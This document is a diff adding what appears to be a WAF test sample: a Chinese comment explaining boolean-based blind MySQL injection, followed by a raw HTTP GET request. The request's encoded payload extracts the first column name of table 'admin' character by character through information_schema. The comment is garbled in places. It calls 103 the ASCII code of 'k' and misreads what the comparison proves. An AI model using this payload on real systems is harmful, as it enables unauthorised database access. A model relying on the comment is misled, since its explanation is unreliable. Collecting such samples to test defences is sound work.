@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_布尔注入-06506246
+# 基于布尔注入,该SQL注入语句的攻击手法是使用 mid() 函数从表 admin 中选取一个列的值，这实际上是对数据库表的非法操作，因为攻击者无法直接在 SQL 查询语句中访问表 admin 的数据。使用 ASCII 函数进行条件筛选，从而实现对数据库中数据的非法访问和操作。QL 注入语句的目的是查询数据库中的数据，并通过 ASCII 码比较来实现某种条件筛选。其中，攻击者通过 mid() 函数从表 admin 中选取一个列的值，然后使用 ASCII 函数获取该值第一个字的 ASCII 码，并与 103 进行比较。这里的 103 是字符 'k' 的 ASCII 码，如果查询结果满足该条件，则说明表 admin 中存在一个包含 'k' 的字符串。
+GET /?id=1%20and%20ascii%28mid%28%28select%20column_name%20from%20information_schema.columns%20where%20table_schema=database%28%29%20and%20table_name=%27admin%27%20limit%200%2C1%29%2C1%2C1%29%29%20%3E%20103&bid=hd_tag_m8mv24e7 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24e7
+RM-PRO-Token: cf7c3f12a3e2bd4170cbac13fe18e179
+RM-PRO-Time: 1742808377935
+User-Agent: curl/7.83.1
+
